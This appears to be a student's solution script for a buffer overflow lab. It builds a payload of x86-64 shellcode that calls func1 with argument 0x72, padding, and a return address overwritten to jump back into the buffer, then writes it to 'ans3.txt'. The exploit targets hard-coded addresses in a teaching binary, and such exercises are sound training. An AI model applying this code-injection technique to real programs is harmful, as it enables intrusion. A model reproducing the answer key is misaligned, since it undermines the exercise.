import sys

# 1. 构造 Shellcode (16 bytes)
# 目标: func1(0x72)
# func1 address: 0x401216
shellcode = (
    b'\x48\xc7\xc7\x72\x00\x00\x00'  # mov rdi, 0x72 (Argument = 114)
    b'\x48\xc7\xc0\x16\x12\x40\x00'  # mov rax, 0x401216 (Address of func1)
    b'\xff\xd0'                      # call rax
)

# 2. 计算 Padding
# 距离 Return Address 总共 40 字节 (Buffer 32 + Saved RBP 8)
# Shellcode 占用了 16 字节
# 还需要填充: 40 - 16 = 24 字节
padding = b'A' * 24

# 3. 覆盖 Return Address
# 这里的关键是填入 jmp_xs 的地址: 0x401334
# 它会自动跳回 buffer 开头去执行我们的 shellcode
jmp_xs_addr = b'\x34\x13\x40\x00\x00\x00\x00\x00'

# 4. 组合 Payload
payload = shellcode + padding + jmp_xs_addr

# 写入
with open('ans3.txt', 'wb') as f:
    f.write(payload)

print(f"Payload generated! Length: {len(payload)}")